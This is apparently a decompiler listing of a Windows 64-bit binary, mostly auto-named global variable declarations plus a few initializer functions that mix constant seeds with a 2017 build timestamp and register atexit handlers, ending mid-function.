char byte_1400DC270[]; // weak
char byte_1400DC271; // weak
char byte_1400DC272; // weak
char byte_1400DC273; // weak
char byte_1400DC274; // weak
char byte_1400DC275; // weak
char byte_1400DC276; // weak
char byte_1400DC277; // weak
char byte_1400DC278; // weak
int dword_1400DC27C; // weak
char byte_1400DC280[]; // weak
char byte_1400DC281; // weak
char byte_1400DC282; // weak
char byte_1400DC283; // weak
char byte_1400DC284; // weak
char byte_1400DC285; // weak
char byte_1400DC286; // weak
char byte_1400DC287; // weak
int dword_1400DC288; // weak
char byte_1400DC28C[]; // weak
char byte_1400DC28D; // weak
char byte_1400DC28E; // weak
char byte_1400DC28F; // weak
char byte_1400DC290; // weak
char byte_1400DC291; // weak
char byte_1400DC292; // weak
int dword_1400DC294; // weak
char byte_1400DC298[]; // weak
char byte_1400DC299; // weak
char byte_1400DC29A; // weak
char byte_1400DC29B; // weak
char byte_1400DC29C; // weak
char byte_1400DC29D; // weak
char byte_1400DC29E; // weak
char byte_1400DC29F; // weak
char byte_1400DC2A0; // weak
char byte_1400DC2A1; // weak
char byte_1400DC2A2; // weak
char byte_1400DC2A3; // weak
char byte_1400DC2A4; // weak
char byte_1400DC2A5; // weak
int dword_1400DC2A8; // weak
char byte_1400DC2B0[]; // weak
char byte_1400DC2B1; // weak
char byte_1400DC2B2; // weak
char byte_1400DC2B3; // weak
char byte_1400DC2B4; // weak
char byte_1400DC2B5; // weak
char byte_1400DC2B6; // weak
char byte_1400DC2B7; // weak
char byte_1400DC2B8; // weak
char byte_1400DC2B9; // weak
int dword_1400DC2BC; // weak
char byte_1400DC2C0[]; // weak
char byte_1400DC2C1; // weak
char byte_1400DC2C2; // weak
char byte_1400DC2C3; // weak
char byte_1400DC2C4; // weak
char byte_1400DC2C5; // weak
char byte_1400DC2C6; // weak
char byte_1400DC2C7; // weak
char byte_1400DC2C8; // weak
char byte_1400DC2C9; // weak
char byte_1400DC2CA; // weak
char byte_1400DC2CB; // weak
char byte_1400DC2CC; // weak
int dword_1400DC2D0; // weak
char byte_1400DC2D8[]; // weak
char byte_1400DC2D9; // weak
char byte_1400DC2DA; // weak
char byte_1400DC2DB; // weak
char byte_1400DC2DC; // weak
char byte_1400DC2DD; // weak
char byte_1400DC2DE; // weak
char byte_1400DC2DF; // weak
char byte_1400DC2E0; // weak
char byte_1400DC2E1; // weak
char byte_1400DC2E2; // weak
char byte_1400DC2E3; // weak
char byte_1400DC2E4; // weak
char byte_1400DC2E5; // weak
char byte_1400DC2E6; // weak
char byte_1400DC2E7; // weak
void *qword_1400DC2F0; // idb
__int64 qword_1400DC300; // weak
__int64 qword_1400DC308; // weak
void *qword_1400DC310; // idb
__int64 qword_1400DC320; // weak
__int64 qword_1400DC328; // weak
void *qword_1400DC330; // idb
__int64 qword_1400DC340; // weak
__int64 qword_1400DC348; // weak
void *qword_1400DC350; // idb
int dword_1400DC370; // weak
int dword_1400DC374; // weak
int dword_1400DC378; // weak
int dword_1400DC37C; // weak
char byte_1400DC380; // weak
int dword_1400DC384; // weak
char byte_1400DC388[]; // weak
char byte_1400DC389; // weak
char byte_1400DC38A; // weak
char byte_1400DC38B; // weak
char byte_1400DC38C; // weak
char byte_1400DC38D; // weak
char byte_1400DC38E; // weak
char byte_1400DC38F; // weak
char byte_1400DC390; // weak
char byte_1400DC391; // weak
char byte_1400DC392; // weak
char byte_1400DC393; // weak
char byte_1400DC394; // weak
char byte_1400DC395; // weak
char byte_1400DC396; // weak
char byte_1400DC397; // weak
char byte_1400DC398; // weak
char byte_1400DC399; // weak
char byte_1400DC39A; // weak
char byte_1400DC39B; // weak
char byte_1400DC39C; // weak
char byte_1400DC39D; // weak
char byte_1400DC39E; // weak
char byte_1400DC39F; // weak
char byte_1400DC3A0; // weak
char byte_1400DC3A1; // weak
char byte_1400DC3A2; // weak
char byte_1400DC3A3; // weak
char byte_1400DC3A4; // weak
char byte_1400DC3A5; // weak
char byte_1400DC3A6; // weak
char byte_1400DC3A7; // weak
char byte_1400DC3A8; // weak
int dword_1400DC3AC; // weak
char byte_1400DC3B0[]; // weak
char byte_1400DC3B1; // weak
char byte_1400DC3B2; // weak
char byte_1400DC3B3; // weak
char byte_1400DC3B4; // weak
char byte_1400DC3B5; // weak
char byte_1400DC3B6; // weak
char byte_1400DC3B7; // weak
char byte_1400DC3B8; // weak
char byte_1400DC3B9; // weak
char byte_1400DC3BA; // weak
char byte_1400DC3BB; // weak
char byte_1400DC3BC; // weak
char byte_1400DC3BD; // weak
char byte_1400DC3BE; // weak
char byte_1400DC3BF; // weak
char byte_1400DC3C0; // weak
char byte_1400DC3C1; // weak
char byte_1400DC3C2; // weak
char byte_1400DC3C3; // weak
char byte_1400DC3C4; // weak
char byte_1400DC3C5; // weak
char byte_1400DC3C6; // weak
char byte_1400DC3C7; // weak
char byte_1400DC3C8; // weak
char byte_1400DC3C9; // weak
char byte_1400DC3CA; // weak
char byte_1400DC3CB; // weak
char byte_1400DC3CC; // weak
char byte_1400DC3CD; // weak
char byte_1400DC3CE; // weak
char byte_1400DC3CF; // weak
char byte_1400DC3D0; // weak
char byte_1400DC3D1; // weak
char byte_1400DC3D2; // weak
char byte_1400DC3D3; // weak
char byte_1400DC3D4; // weak
char byte_1400DC3D5; // weak
char byte_1400DC3D6; // weak
char byte_1400DC3D7; // weak
char byte_1400DC3D8; // weak
char byte_1400DC3D9; // weak
char byte_1400DC3DA; // weak
char byte_1400DC3DB; // weak
char byte_1400DC3DC; // weak
char byte_1400DC3DD; // weak
char byte_1400DC3DE; // weak
char byte_1400DC3DF; // weak
char byte_1400DC3E0; // weak
char byte_1400DC3E1; // weak
char byte_1400DC3E2; // weak
char byte_1400DC3E3; // weak
char byte_1400DC3E4; // weak
char byte_1400DC3E5; // weak
char byte_1400DC3E6; // weak
char byte_1400DC3E7; // weak
char byte_1400DC3E8; // weak
char byte_1400DC3E9; // weak
char byte_1400DC3EA; // weak
char byte_1400DC3EB; // weak
char byte_1400DC3EC; // weak
char byte_1400DC3ED; // weak
char byte_1400DC3EE; // weak
char byte_1400DC3EF; // weak
char byte_1400DC3F0; // weak
char byte_1400DC3F1; // weak
char byte_1400DC3F2; // weak
char byte_1400DC3F3; // weak
char byte_1400DC3F4; // weak
char byte_1400DC3F5; // weak
char byte_1400DC3F6; // weak
char byte_1400DC3F7; // weak
char byte_1400DC3F8; // weak
char byte_1400DC3F9; // weak
char byte_1400DC3FA; // weak
char byte_1400DC3FB; // weak
char byte_1400DC3FC; // weak
char byte_1400DC3FD; // weak
char byte_1400DC3FE; // weak
char byte_1400DC3FF; // weak
char byte_1400DC400; // weak
char byte_1400DC401; // weak
char byte_1400DC402; // weak
char byte_1400DC403; // weak
char byte_1400DC404; // weak
char byte_1400DC405; // weak
char byte_1400DC406; // weak
char byte_1400DC407; // weak
char byte_1400DC408; // weak
char byte_1400DC409; // weak
char byte_1400DC40A; // weak
char byte_1400DC40B; // weak
char byte_1400DC40C; // weak
char byte_1400DC40D; // weak
char byte_1400DC40E; // weak
char byte_1400DC40F; // weak
char byte_1400DC410; // weak
char byte_1400DC411; // weak
char byte_1400DC412; // weak
char byte_1400DC413; // weak
char byte_1400DC414; // weak
char byte_1400DC415; // weak
char byte_1400DC416; // weak
char byte_1400DC417; // weak
char byte_1400DC418; // weak
char byte_1400DC419; // weak
char byte_1400DC41A; // weak
char byte_1400DC41B; // weak
char byte_1400DC41C; // weak
char byte_1400DC41D; // weak
char byte_1400DC41E; // weak
char byte_1400DC41F; // weak
char byte_1400DC420; // weak
char byte_1400DC421; // weak
char byte_1400DC422; // weak
char byte_1400DC423; // weak
char byte_1400DC424; // weak
char byte_1400DC425; // weak
char byte_1400DC426; // weak
char byte_1400DC427; // weak
char byte_1400DC428; // weak
char byte_1400DC429; // weak
char byte_1400DC42A; // weak
char byte_1400DC42B; // weak
char byte_1400DC42C; // weak
char byte_1400DC42D; // weak
char byte_1400DC42E; // weak
char byte_1400DC42F; // weak
char byte_1400DC430; // weak
int dword_1400DC434; // weak
char byte_1400DC440[]; // weak
char byte_1400DC441; // weak
char byte_1400DC442; // weak
char byte_1400DC443; // weak
char byte_1400DC444; // weak
char byte_1400DC445; // weak
char byte_1400DC446; // weak
char byte_1400DC447; // weak
char byte_1400DC448; // weak
char byte_1400DC449; // weak
char byte_1400DC44A; // weak
char byte_1400DC44B; // weak
char byte_1400DC44C; // weak
char byte_1400DC44D; // weak
char byte_1400DC44E; // weak
char byte_1400DC44F; // weak
char byte_1400DC450; // weak
char byte_1400DC451; // weak
char byte_1400DC452; // weak
char byte_1400DC453; // weak
char byte_1400DC454; // weak
char byte_1400DC455; // weak
char byte_1400DC456; // weak
char byte_1400DC457; // weak
char byte_1400DC458; // weak
char byte_1400DC459; // weak
char byte_1400DC45A; // weak
char byte_1400DC45B; // weak
char byte_1400DC45C; // weak
char byte_1400DC45D; // weak
char byte_1400DC45E; // weak
char byte_1400DC45F; // weak
char byte_1400DC460; // weak
char byte_1400DC461; // weak
char byte_1400DC462; // weak
char byte_1400DC463; // weak
char byte_1400DC464; // weak
char byte_1400DC465; // weak
char byte_1400DC466; // weak
char byte_1400DC467; // weak
char byte_1400DC468; // weak
char byte_1400DC469; // weak
char byte_1400DC46A; // weak
char byte_1400DC46B; // weak
char byte_1400DC46C; // weak
char byte_1400DC46D; // weak
char byte_1400DC46E; // weak
char byte_1400DC46F; // weak
char byte_1400DC470; // weak
char byte_1400DC471; // weak
char byte_1400DC472; // weak
char byte_1400DC473; // weak
char byte_1400DC474; // weak
char byte_1400DC475; // weak
char byte_1400DC476; // weak
char byte_1400DC477; // weak
char byte_1400DC478; // weak
char byte_1400DC479; // weak
char byte_1400DC47A; // weak
char byte_1400DC47B; // weak
char byte_1400DC47C; // weak
char byte_1400DC47D; // weak
char byte_1400DC47E; // weak
char byte_1400DC47F; // weak
char byte_1400DC480; // weak
char byte_1400DC481; // weak
char byte_1400DC482; // weak
char byte_1400DC483; // weak
char byte_1400DC484; // weak
char byte_1400DC485; // weak
char byte_1400DC486; // weak
char byte_1400DC487; // weak
char byte_1400DC488; // weak
char byte_1400DC489; // weak
char byte_1400DC48A; // weak
char byte_1400DC48B; // weak
char byte_1400DC48C; // weak
char byte_1400DC48D; // weak
char byte_1400DC48E; // weak
char byte_1400DC48F; // weak
char byte_1400DC490; // weak
char byte_1400DC491; // weak
char byte_1400DC492; // weak
char byte_1400DC493; // weak
char byte_1400DC494; // weak
char byte_1400DC495; // weak
char byte_1400DC496; // weak
char byte_1400DC497; // weak
char byte_1400DC498; // weak
char byte_1400DC499; // weak
char byte_1400DC49A; // weak
char byte_1400DC49B; // weak
char byte_1400DC49C; // weak
char byte_1400DC49D; // weak
char byte_1400DC49E; // weak
char byte_1400DC49F; // weak
char byte_1400DC4A0; // weak
char byte_1400DC4A1; // weak
char byte_1400DC4A2; // weak
char byte_1400DC4A3; // weak
char byte_1400DC4A4; // weak
char byte_1400DC4A5; // weak
char byte_1400DC4A6; // weak
char byte_1400DC4A7; // weak
char byte_1400DC4A8; // weak
char byte_1400DC4A9; // weak
char byte_1400DC4AA; // weak
char byte_1400DC4AB; // weak
char byte_1400DC4AC; // weak
char byte_1400DC4AD; // weak
char byte_1400DC4AE; // weak
char byte_1400DC4AF; // weak
char byte_1400DC4B0; // weak
char byte_1400DC4B1; // weak
char byte_1400DC4B2; // weak
char byte_1400DC4B3; // weak
char byte_1400DC4B4; // weak
char byte_1400DC4B5; // weak
char byte_1400DC4B6; // weak
char byte_1400DC4B7; // weak
char byte_1400DC4B8; // weak
char byte_1400DC4B9; // weak
char byte_1400DC4BA; // weak
char byte_1400DC4BB; // weak
char byte_1400DC4BC; // weak
char byte_1400DC4BD; // weak
char byte_1400DC4BE; // weak
char byte_1400DC4BF; // weak
char byte_1400DC4C0; // weak
int dword_1400DC4C4; // weak
char byte_1400DC4D0[]; // weak
char byte_1400DC4D1; // weak
char byte_1400DC4D2; // weak
char byte_1400DC4D3; // weak
char byte_1400DC4D4; // weak
char byte_1400DC4D5; // weak
char byte_1400DC4D6; // weak
char byte_1400DC4D7; // weak
char byte_1400DC4D8; // weak
char byte_1400DC4D9; // weak
char byte_1400DC4DA; // weak
char byte_1400DC4DB; // weak
char byte_1400DC4DC; // weak
char byte_1400DC4DD; // weak
char byte_1400DC4DE; // weak
char byte_1400DC4DF; // weak
char byte_1400DC4E0; // weak
char byte_1400DC4E1; // weak
char byte_1400DC4E2; // weak
char byte_1400DC4E3; // weak
char byte_1400DC4E4; // weak
char byte_1400DC4E5; // weak
char byte_1400DC4E6; // weak
char byte_1400DC4E7; // weak
char byte_1400DC4E8; // weak
char byte_1400DC4E9; // weak
char byte_1400DC4EA; // weak
char byte_1400DC4EB; // weak
char byte_1400DC4EC; // weak
char byte_1400DC4ED; // weak
char byte_1400DC4EE; // weak
char byte_1400DC4EF; // weak
char byte_1400DC4F0; // weak
char byte_1400DC4F1; // weak
char byte_1400DC4F2; // weak
char byte_1400DC4F3; // weak
char byte_1400DC4F4; // weak
char byte_1400DC4F5; // weak
char byte_1400DC4F6; // weak
char byte_1400DC4F7; // weak
char byte_1400DC4F8; // weak
char byte_1400DC4F9; // weak
char byte_1400DC4FA; // weak
char byte_1400DC4FB; // weak
char byte_1400DC4FC; // weak
char byte_1400DC4FD; // weak
char byte_1400DC4FE; // weak
char byte_1400DC4FF; // weak
char byte_1400DC500; // weak
char byte_1400DC501; // weak
char byte_1400DC502; // weak
char byte_1400DC503; // weak
char byte_1400DC504; // weak
char byte_1400DC505; // weak
char byte_1400DC506; // weak
char byte_1400DC507; // weak
char byte_1400DC508; // weak
char byte_1400DC509; // weak
char byte_1400DC50A; // weak
char byte_1400DC50B; // weak
char byte_1400DC50C; // weak
char byte_1400DC50D; // weak
char byte_1400DC50E; // weak
char byte_1400DC50F; // weak
char byte_1400DC510; // weak
char byte_1400DC511; // weak
char byte_1400DC512; // weak
char byte_1400DC513; // weak
char byte_1400DC514; // weak
char byte_1400DC515; // weak
char byte_1400DC516; // weak
char byte_1400DC517; // weak
char byte_1400DC518; // weak
char byte_1400DC519; // weak
char byte_1400DC51A; // weak
char byte_1400DC51B; // weak
char byte_1400DC51C; // weak
char byte_1400DC51D; // weak
char byte_1400DC51E; // weak
char byte_1400DC51F; // weak
char byte_1400DC520; // weak
char byte_1400DC521; // weak
char byte_1400DC522; // weak
char byte_1400DC523; // weak
char byte_1400DC524; // weak
char byte_1400DC525; // weak
char byte_1400DC526; // weak
char byte_1400DC527; // weak
char byte_1400DC528; // weak
char byte_1400DC529; // weak
char byte_1400DC52A; // weak
char byte_1400DC52B; // weak
char byte_1400DC52C; // weak
char byte_1400DC52D; // weak
char byte_1400DC52E; // weak
char byte_1400DC52F; // weak
char byte_1400DC530; // weak
char byte_1400DC531; // weak
char byte_1400DC532; // weak
char byte_1400DC533; // weak
char byte_1400DC534; // weak
char byte_1400DC535; // weak
char byte_1400DC536; // weak
char byte_1400DC537; // weak
char byte_1400DC538; // weak
char byte_1400DC539; // weak
char byte_1400DC53A; // weak
char byte_1400DC53B; // weak
char byte_1400DC53C; // weak
char byte_1400DC53D; // weak
char byte_1400DC53E; // weak
char byte_1400DC53F; // weak
char byte_1400DC540; // weak
char byte_1400DC541; // weak
char byte_1400DC542; // weak
char byte_1400DC543; // weak
char byte_1400DC544; // weak
char byte_1400DC545; // weak
char byte_1400DC546; // weak
char byte_1400DC547; // weak
char byte_1400DC548; // weak
char byte_1400DC549; // weak
char byte_1400DC54A; // weak
char byte_1400DC54B; // weak
char byte_1400DC54C; // weak
char byte_1400DC54D; // weak
char byte_1400DC54E; // weak
char byte_1400DC54F; // weak
char byte_1400DC550; // weak
int dword_1400DC554; // weak
char byte_1400DC560[]; // weak
char byte_1400DC561; // weak
char byte_1400DC562; // weak
char byte_1400DC563; // weak
char byte_1400DC564; // weak
char byte_1400DC565; // weak
char byte_1400DC566; // weak
char byte_1400DC567; // weak
char byte_1400DC568; // weak
char byte_1400DC569; // weak
char byte_1400DC56A; // weak
char byte_1400DC56B; // weak
char byte_1400DC56C; // weak
char byte_1400DC56D; // weak
char byte_1400DC56E; // weak
char byte_1400DC56F; // weak
char byte_1400DC570; // weak
char byte_1400DC571; // weak
char byte_1400DC572; // weak
char byte_1400DC573; // weak
char byte_1400DC574; // weak
char byte_1400DC575; // weak
char byte_1400DC576; // weak
char byte_1400DC577; // weak
char byte_1400DC578; // weak
char byte_1400DC579; // weak
char byte_1400DC57A; // weak
char byte_1400DC57B; // weak
char byte_1400DC57C; // weak
char byte_1400DC57D; // weak
char byte_1400DC57E; // weak
char byte_1400DC57F; // weak
char byte_1400DC580; // weak
char byte_1400DC581; // weak
char byte_1400DC582; // weak
char byte_1400DC583; // weak
char byte_1400DC584; // weak
char byte_1400DC585; // weak
char byte_1400DC586; // weak
char byte_1400DC587; // weak
char byte_1400DC588; // weak
char byte_1400DC589; // weak
char byte_1400DC58A; // weak
char byte_1400DC58B; // weak
char byte_1400DC58C; // weak
char byte_1400DC58D; // weak
char byte_1400DC58E; // weak
char byte_1400DC58F; // weak
char byte_1400DC590; // weak
char byte_1400DC591; // weak
char byte_1400DC592; // weak
char byte_1400DC593; // weak
char byte_1400DC594; // weak
char byte_1400DC595; // weak
char byte_1400DC596; // weak
char byte_1400DC597; // weak
char byte_1400DC598; // weak
char byte_1400DC599; // weak
char byte_1400DC59A; // weak
char byte_1400DC59B; // weak
char byte_1400DC59C; // weak
char byte_1400DC59D; // weak
char byte_1400DC59E; // weak
char byte_1400DC59F; // weak
char byte_1400DC5A0; // weak
char byte_1400DC5A1; // weak
char byte_1400DC5A2; // weak
char byte_1400DC5A3; // weak
char byte_1400DC5A4; // weak
char byte_1400DC5A5; // weak
char byte_1400DC5A6; // weak
char byte_1400DC5A7; // weak
char byte_1400DC5A8; // weak
char byte_1400DC5A9; // weak
char byte_1400DC5AA; // weak
char byte_1400DC5AB; // weak
char byte_1400DC5AC; // weak
char byte_1400DC5AD; // weak
char byte_1400DC5AE; // weak
char byte_1400DC5AF; // weak
char byte_1400DC5B0; // weak
char byte_1400DC5B1; // weak
char byte_1400DC5B2; // weak
char byte_1400DC5B3; // weak
char byte_1400DC5B4; // weak
char byte_1400DC5B5; // weak
char byte_1400DC5B6; // weak
char byte_1400DC5B7; // weak
char byte_1400DC5B8; // weak
char byte_1400DC5B9; // weak
char byte_1400DC5BA; // weak
char byte_1400DC5BB; // weak
char byte_1400DC5BC; // weak
char byte_1400DC5BD; // weak
char byte_1400DC5BE; // weak
char byte_1400DC5BF; // weak
char byte_1400DC5C0; // weak
char byte_1400DC5C1; // weak
char byte_1400DC5C2; // weak
char byte_1400DC5C3; // weak
char byte_1400DC5C4; // weak
char byte_1400DC5C5; // weak
char byte_1400DC5C6; // weak
char byte_1400DC5C7; // weak
char byte_1400DC5C8; // weak
char byte_1400DC5C9; // weak
char byte_1400DC5CA; // weak
char byte_1400DC5CB; // weak
char byte_1400DC5CC; // weak
char byte_1400DC5CD; // weak
char byte_1400DC5CE; // weak
char byte_1400DC5CF; // weak
char byte_1400DC5D0; // weak
char byte_1400DC5D1; // weak
char byte_1400DC5D2; // weak
char byte_1400DC5D3; // weak
char byte_1400DC5D4; // weak
char byte_1400DC5D5; // weak
char byte_1400DC5D6; // weak
char byte_1400DC5D7; // weak
char byte_1400DC5D8; // weak
char byte_1400DC5D9; // weak
char byte_1400DC5DA; // weak
char byte_1400DC5DB; // weak
char byte_1400DC5DC; // weak
char byte_1400DC5DD; // weak
char byte_1400DC5DE; // weak
char byte_1400DC5DF; // weak
char byte_1400DC5E0; // weak
int dword_1400DC5E4; // weak
char byte_1400DC5E8[]; // weak
char byte_1400DC5E9; // weak
char byte_1400DC5EA; // weak
char byte_1400DC5EB; // weak
char byte_1400DC5EC; // weak
char byte_1400DC5ED; // weak
char byte_1400DC5EE; // weak
char byte_1400DC5EF; // weak
char byte_1400DC5F0; // weak
char byte_1400DC5F1; // weak
char byte_1400DC5F2; // weak
char byte_1400DC5F3; // weak
char byte_1400DC5F4; // weak
char byte_1400DC5F5; // weak
char byte_1400DC5F6; // weak
char byte_1400DC5F7; // weak
char byte_1400DC5F8; // weak
char byte_1400DC5F9; // weak
char byte_1400DC5FA; // weak
char byte_1400DC5FB; // weak
char byte_1400DC5FC; // weak
char byte_1400DC5FD; // weak
char byte_1400DC5FE; // weak
char byte_1400DC5FF; // weak
char byte_1400DC600; // weak
char byte_1400DC601; // weak
char byte_1400DC602; // weak
char byte_1400DC603; // weak
char byte_1400DC604; // weak
char byte_1400DC605; // weak
char byte_1400DC606; // weak
char byte_1400DC607; // weak
char byte_1400DC608; // weak
char byte_1400DC609; // weak
char byte_1400DC60A; // weak
char byte_1400DC60B; // weak
_UNKNOWN unk_1400DC648; // weak
int dword_1400DCBE8; // weak
int dword_1400DCBEC; // weak
int dword_1400DCBF0; // weak
int dword_1400DCBF4; // weak
int dword_1400DCBFC; // weak
int dword_1400DCC00; // weak
int dword_1400DCC04; // weak
int dword_1400DCC08; // weak
char byte_1400DCC0C; // weak
_UNKNOWN unk_1400DCC10; // weak
int dword_1400DD014; // weak
int dword_1400DD018; // weak
int dword_1400DD01C; // weak
int dword_1400DD020; // weak
int dword_1400DD02C; // weak
int dword_1400DD030; // weak
int dword_1400DD034; // weak
int dword_1400DD038; // weak
__int64 qword_1400DD040; // weak
_UNKNOWN unk_1400DD048; // weak
char byte_1400DD069; // weak
__int64 qword_1400DD070; // weak
__int64 qword_1400DD078; // weak
_UNKNOWN unk_1400DD080; // weak
char byte_1400DD091; // weak
__int64 qword_1400DD098; // weak
__int64 qword_1400DD0A0; // weak
__int64 qword_1400DD0A8; // weak
char byte_1400DD0B8; // weak
int dword_1400DD0BC; // weak
char byte_1400DD0C0[]; // weak
char byte_1400DD0C1; // weak
char byte_1400DD0C2; // weak
char byte_1400DD0C3; // weak
char byte_1400DD0C4; // weak
char byte_1400DD0C5; // weak
int dword_1400DD0C8; // weak
char byte_1400DD0D0[]; // weak
char byte_1400DD0D1; // weak
char byte_1400DD0D2; // weak
char byte_1400DD0D3; // weak
char byte_1400DD0D4; // weak
char byte_1400DD0D5; // weak
char byte_1400DD0D6; // weak
char byte_1400DD0D7; // weak
char byte_1400DD0D8; // weak
char byte_1400DD0D9; // weak
char byte_1400DD0DA; // weak
char byte_1400DD0DB; // weak
char byte_1400DD0DC; // weak
char byte_1400DD0DD; // weak
char byte_1400DD0DE; // weak
char byte_1400DD0DF; // weak
int dword_1400DD0E0; // weak
char byte_1400DD0E4[]; // weak
char byte_1400DD0E5; // weak
char byte_1400DD0E6; // weak
char byte_1400DD0E7; // weak
int dword_1400DD0E8; // weak
char byte_1400DD0EC[]; // weak
char byte_1400DD0ED; // weak
char byte_1400DD0EE; // weak
char byte_1400DD0EF; // weak
int dword_1400DD0F0; // weak
char byte_1400DD0F4[]; // weak
char byte_1400DD0F5; // weak
char byte_1400DD0F6; // weak
char byte_1400DD0F7; // weak
char byte_1400DD0F8; // weak
char byte_1400DD0F9; // weak
char byte_1400DD0FA; // weak
char byte_1400DD0FB; // weak
int dword_1400DD0FC; // weak
char byte_1400DD100[]; // weak
char byte_1400DD101; // weak
char byte_1400DD102; // weak
char byte_1400DD103; // weak
char byte_1400DD104; // weak
char byte_1400DD105; // weak
char byte_1400DD106; // weak
char byte_1400DD107; // weak
int dword_1400DD108; // weak
char byte_1400DD110[]; // weak
char byte_1400DD111; // weak
char byte_1400DD112; // weak
char byte_1400DD113; // weak
char byte_1400DD114; // weak
char byte_1400DD115; // weak
char byte_1400DD116; // weak
char byte_1400DD117; // weak
char byte_1400DD118; // weak
int dword_1400DD11C; // weak
char byte_1400DD120[]; // weak
char byte_1400DD121; // weak
char byte_1400DD122; // weak
char byte_1400DD123; // weak
char byte_1400DD124; // weak
char byte_1400DD125; // weak
char byte_1400DD126; // weak
__int64 qword_1400DD128; // weak
char byte_1400DD140; // weak
_DWORD dword_1400DD150[255]; // idb
_UNKNOWN unk_1400DD54C; // weak
int dword_1400DD558; // weak
int dword_1400DD55C; // weak
int dword_1400DD560; // weak
int dword_1400DD564; // weak
int dword_1400DD56C; // weak
int dword_1400DD570; // weak
int dword_1400DD574; // weak
int dword_1400DD578; // weak
int dword_1400DD580; // weak
int dword_1400DD584; // weak
int dword_1400DD588; // weak
int dword_1400DD58C; // weak
int dword_1400DD594; // weak
int dword_1400DD598; // weak
int dword_1400DD59C; // weak
int dword_1400DD5A0; // weak
int dword_1400DD5A8; // weak
int dword_1400DD5AC; // weak
int dword_1400DD5B0; // weak
int dword_1400DD5B4; // weak
int dword_1400DD5BC; // weak
int dword_1400DD5C0; // weak
int dword_1400DD5C4; // weak
int dword_1400DD5C8; // weak
int dword_1400DD5D0; // weak
int dword_1400DD5D4; // weak
int dword_1400DD5D8; // weak
int dword_1400DD5DC; // weak
char byte_1400DD5E0; // weak
int dword_1400DD5E4; // weak
char byte_1400DD5E8[]; // weak
char byte_1400DD5E9; // weak
char byte_1400DD5EA; // weak
char byte_1400DD5EB; // weak
char byte_1400DD5EC; // weak
int dword_1400DD5F4; // weak
int dword_1400DD5F8; // weak
int dword_1400DD5FC; // weak
int dword_1400DD600; // weak
int dword_1400DD608; // weak
int dword_1400DD60C; // weak
int dword_1400DD610; // weak
int dword_1400DD614; // weak
int dword_1400DD61C; // weak
int dword_1400DD620; // weak
int dword_1400DD624; // weak
int dword_1400DD628; // weak
int dword_1400DD630; // weak
int dword_1400DD634; // weak
int dword_1400DD638; // weak
int dword_1400DD63C; // weak
int dword_1400DD644; // weak
int dword_1400DD648; // weak
int dword_1400DD64C; // weak
int dword_1400DD650; // weak
int dword_1400DD658; // weak
int dword_1400DD65C; // weak
int dword_1400DD660; // weak
int dword_1400DD664; // weak
void *qword_1400DD668; // idb
void *qword_1400DD678; // idb


//----- (00000001400010F0) ----------------------------------------------------
char *sub_1400010F0()
{
  char *result; // rax

  result = sub_140006A10();
  qword_1400D9910 = result;
  return result;
}

//----- (0000000140001110) ----------------------------------------------------
__int64 sub_140001110()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9920 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9920: using guessed type int dword_1400D9920;

//----- (0000000140001130) ----------------------------------------------------
__int64 sub_140001130()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D990C = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D990C: using guessed type int dword_1400D990C;

//----- (0000000140001150) ----------------------------------------------------
__int64 sub_140001150()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D99B4 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D99B4: using guessed type int dword_1400D99B4;

//----- (0000000140001170) ----------------------------------------------------
__int64 sub_140001170()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D99B0 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D99B0: using guessed type int dword_1400D99B0;

//----- (0000000140001190) ----------------------------------------------------
__int64 sub_140001190()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D99BC = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D99BC: using guessed type int dword_1400D99BC;

//----- (00000001400011B0) ----------------------------------------------------
__int64 sub_1400011B0()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D99AC = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D99AC: using guessed type int dword_1400D99AC;

//----- (00000001400011D0) ----------------------------------------------------
int sub_1400011D0()
{
  return atexit((void (__cdecl *)())sub_14009FBB0);
}

//----- (00000001400011E0) ----------------------------------------------------
int sub_1400011E0()
{
  sub_140018280(&unk_1400D99E0);
  return atexit(sub_14009FBF0);
}
// 140018280: using guessed type __int64 __fastcall sub_140018280(_QWORD);

//----- (0000000140001200) ----------------------------------------------------
int sub_140001200()
{
  return atexit((void (__cdecl *)())sub_14009FC00);
}

//----- (0000000140001210) ----------------------------------------------------
__int64 sub_140001210()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9A38 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9A38: using guessed type int dword_1400D9A38;

//----- (0000000140001230) ----------------------------------------------------
__int64 sub_140001230()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9A30 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9A30: using guessed type int dword_1400D9A30;

//----- (0000000140001250) ----------------------------------------------------
__int64 sub_140001250()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9A3C = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9A3C: using guessed type int dword_1400D9A3C;

//----- (0000000140001270) ----------------------------------------------------
__int64 sub_140001270()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9A2C = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9A2C: using guessed type int dword_1400D9A2C;

//----- (0000000140001290) ----------------------------------------------------
__int64 sub_140001290()
{
